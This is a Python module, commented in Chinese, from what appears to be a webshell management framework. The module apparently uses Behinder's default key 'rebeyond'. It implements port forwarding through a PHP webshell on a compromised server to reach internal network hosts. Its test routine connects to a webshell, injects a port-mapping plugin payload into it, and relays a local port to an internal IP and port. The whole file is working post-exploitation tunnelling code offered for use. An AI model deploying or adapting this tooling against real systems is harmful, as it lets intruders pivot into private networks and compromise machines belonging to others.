#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
PortMappingService.py - 端口映射服务
实现内网穿透的端口映射功能
"""

import socket
import threading
import time
import hashlib
import os
import struct
from typing import Optional
from .phpShell import PhpShell
from .phpPayload import phpPayload

class PortMappingService:
    """端口映射服务类"""
    
    def __init__(self, shell, local_port: int, target_ip: str, target_port: int, payload_class_name: str = "PortMappingService"):
        """
        初始化端口映射服务
        
        Args:
            shell: PhpShell 实例
            local_port: 本地监听端口
            target_ip: 目标内网 IP
            target_port: 目标内网端口
            payload_class_name: 服务端 payload 类名
        """
        self.shell = shell
        self.local_port = local_port
        self.target_ip = target_ip
        self.target_port = target_port
        self.payload_class_name = payload_class_name
        
        self.is_running = False
        self.server_socket = None
        self.client_threads = []
        
        # 统计信息
        self.connection_count = 0
        self.total_bytes_sent = 0
        self.total_bytes_received = 0
    
    def start(self) -> bool:
        """启动端口映射服务"""
        try:
            print(f"\n{'='*60}")
            print(f"🚀 启动端口映射服务")
            print(f"{'='*60}")
            print(f"本地端口: {self.local_port}")
            print(f"目标地址: {self.target_ip}:{self.target_port}")
            print(f"{'='*60}\n")
            
            # 创建服务器 socket
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # 设置 socket 选项以支持端口重用
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # 设置 SO_LINGER 选项，立即关闭连接，不等待数据发送完成
            # 这样可以避免 TIME_WAIT 状态占用端口
            linger = struct.pack('ii', 1, 0)  # linger {l_onoff, l_linger}
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, linger)
            
            # 设置超时，使 accept() 可以被中断
            self.server_socket.settimeout(1.0)
            
            self.server_socket.bind(('0.0.0.0', self.local_port))
            self.server_socket.listen(10)
            
            self.is_running = True
            
            print(f"✅ 端口映射服务已启动，监听端口: {self.local_port}")
            print(f"📡 等待客户端连接...\n")
            
            # 开始接受连接
            accept_thread = threading.Thread(target=self._accept_connections, daemon=True)
            accept_thread.start()
            
            return True
            
        except Exception as e:
            print(f"[ERROR] 启动端口映射服务失败: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def stop(self):
        """停止端口映射服务"""
        print(f"\n{'='*60}")
        print(f"🛑 正在停止端口映射服务...")
        print(f"{'='*60}")
        
        self.is_running = False
        
        # 关闭服务器 socket
        if self.server_socket:
            try:
                # 先 shutdown，再 close，确保端口被正确释放
                self.server_socket.shutdown(socket.SHUT_RDWR)
            except:
                pass
            
            try:
                self.server_socket.close()
            except:
                pass
            
            # 将 socket 置为 None
            self.server_socket = None
        
        # 等待所有客户端线程结束
        for thread in self.client_threads:
            if thread.is_alive():
                thread.join(timeout=1)
        
        # 清空线程列表
        self.client_threads.clear()
        
        # 打印统计信息
        print(f"\n📊 连接统计:")
        print(f"   总连接数: {self.connection_count}")
        print(f"   发送字节: {self.total_bytes_sent}")
        print(f"   接收字节: {self.total_bytes_received}")
        print(f"\n✅ 端口映射服务已停止\n")
    
    def _accept_connections(self):
        """接受客户端连接"""
        while self.is_running:
            try:
                client_socket, client_address = self.server_socket.accept()
                self.connection_count += 1
                
                print(f"[INFO] 新客户端连接: {client_address[0]}:{client_address[1]} (连接#{self.connection_count})")
                
                # 为每个客户端创建处理线程
                client_thread = threading.Thread(
                    target=self._handle_client,
                    args=(client_socket, client_address),
                    daemon=True
                )
                client_thread.start()
                self.client_threads.append(client_thread)
                
            except socket.timeout:
                # 超时是正常的，继续循环检查 is_running
                continue
            except Exception as e:
                if self.is_running:
                    # 只在服务运行时打印错误
                    print(f"[ERROR] 接受连接失败: {e}")
                break
    
    def _handle_client(self, client_socket: socket.socket, client_address: tuple):
        """处理单个客户端连接"""
        # 生成唯一的映射 ID
        mapping_id = self._generate_mapping_id(client_address)
        
        print(f"[DEBUG] 为客户端 {client_address[0]}:{client_address[1]} 创建映射 ID: {mapping_id}")
        
        try:
            # 1. 在服务端创建映射配置
            if not self.shell.create_mapping(mapping_id, self.target_ip, self.target_port, self.payload_class_name):
                print(f"[ERROR] 创建映射配置失败")
                client_socket.close()
                return
            
            # 2. 开始数据转发
            self._forward_data(client_socket, mapping_id)
            
        except Exception as e:
            print(f"[ERROR] 处理客户端连接异常: {e}")
            import traceback
            traceback.print_exc()
        finally:
            # 3. 清理资源
            try:
                self.shell.close_mapping(mapping_id, self.payload_class_name)
            except:
                pass
            
            try:
                client_socket.close()
            except:
                pass
            
            print(f"[INFO] 客户端 {client_address[0]}:{client_address[1]} 连接已关闭")
    
    def _forward_data(self, client_socket: socket.socket, mapping_id: str):
        """进行双向数据转发"""
        try:
            # 设置 socket 为非阻塞模式
            client_socket.settimeout(0.1)
            
            while self.is_running:
                has_data_activity = False
                client_data = None
                
                # 步骤1：尝试从客户端读取数据
                try:
                    client_data = client_socket.recv(4096)
                    if client_data and len(client_data) > 0:
                        print(f"[DEBUG] 客户端->内网: 接收 {len(client_data)} 字节 (映射ID: {mapping_id})")
                        self.total_bytes_sent += len(client_data)
                        has_data_activity = True
                    elif len(client_data) == 0:
                        print(f"[DEBUG] 客户端连接关闭 (映射ID: {mapping_id})")
                        break
                        
                except socket.timeout:
                    # 客户端暂时没有数据，继续
                    pass
                except Exception as e:
                    if "timed out" not in str(e).lower():
                        print(f"[DEBUG] 客户端读取异常: {e}")
                        break
                
                # 步骤2：使用 mapping_read_write 完成写入和读取
                try:
                    # 调用 mapping_read_write，无论是否有数据都要调用（可能只读取）
                    remote_data = self.shell.mapping_read_write(
                        mapping_id,
                        client_data if client_data else b"",  # 没有数据时传空字节
                        self.payload_class_name
                    )
                    
                    if remote_data is None:
                        print(f"[DEBUG] mapping_read_write 返回 None (映射ID: {mapping_id})")
                        # 如果有写入但读取失败，可能是暂时性问题
                        if has_data_activity:
                            time.sleep(0.05)
                            continue
                        else:
                            break
                    elif isinstance(remote_data, bytes) and len(remote_data) > 0:
                        print(f"[DEBUG] 内网->客户端: 接收 {len(remote_data)} 字节 (映射ID: {mapping_id})")
                        self.total_bytes_received += len(remote_data)
                        
                        try:
                            client_socket.send(remote_data)
                            has_data_activity = True
                        except:
                            print(f"[DEBUG] 客户端连接已断开 (映射ID: {mapping_id})")
                            break
                    
                except Exception as e:
                    print(f"[DEBUG] mapping_read_write 异常: {e} (映射ID: {mapping_id})")
                    if has_data_activity:
                        # 有数据活动但出错，短暂等待后继续
                        time.sleep(0.05)
                        continue
                    else:
                        break
                
                # 如果没有任何数据活动，短暂休息
                if not has_data_activity:
                    time.sleep(0.05)
                    
        except Exception as e:
            print(f"[ERROR] 数据转发异常: {e}")
            import traceback
            traceback.print_exc()
    
    def _generate_mapping_id(self, client_address: tuple) -> str:
        """生成唯一的映射 ID"""
        unique_string = f"{client_address[0]}:{client_address[1]}:{time.time()}:{os.urandom(8).hex()}"
        return hashlib.md5(unique_string.encode()).hexdigest()


# ====== 测试代码 ======

def main():
    """测试端口映射功能"""
    import sys
    sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    
    
    # 配置参数
    webshell_url = "http://localhost:8000/xor_base64.php"
    param_name = "pass"
    secret_key = "rebeyond"
    
    local_port = 1080
    target_ip = "172.26.32.1"
    target_port = 7000
    
    print("🎯 PHP Webshell 端口映射功能测试")
    print("=" * 60)
    
    # 1. 创建 PhpShell 实例并初始化
    shell = PhpShell(webshell_url, param_name, secret_key)
    shell.response_encrypt_type = 'xor_base64'
    
    if not shell.init_payload(payload_name="mainPayload_xor_base64"):
        print("❌ Payload 初始化失败")
        return
    
    print("✅ Payload 初始化成功\n")
    
    # 2. 加载端口映射插件
    print("📦 加载端口映射插件...")
    
    # 读取插件代码
    plugin_path = os.path.join(
        os.path.dirname(os.path.abspath(__file__)),
        "payload",
        "PortMappingService.php"
    )
    
    payload = phpPayload()
    plugin_code = payload.getPayload(
        payload_name="PortMappingService",
        webshell_id=None
    )
    
    if not shell.include("PortMappingService", plugin_code):
        print("❌ 加载端口映射插件失败")
        return
    
    print("✅ 端口映射插件加载成功\n")
    
    # 3. 创建并启动端口映射服务
    mapping_service = PortMappingService(
        shell=shell,
        local_port=local_port,
        target_ip=target_ip,
        target_port=target_port
    )
    
    if not mapping_service.start():
        print("❌ 启动端口映射服务失败")
        return
    
    # 4. 保持服务运行
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\n收到中断信号，正在停止服务...")
        mapping_service.stop()


if __name__ == "__main__":
    main()

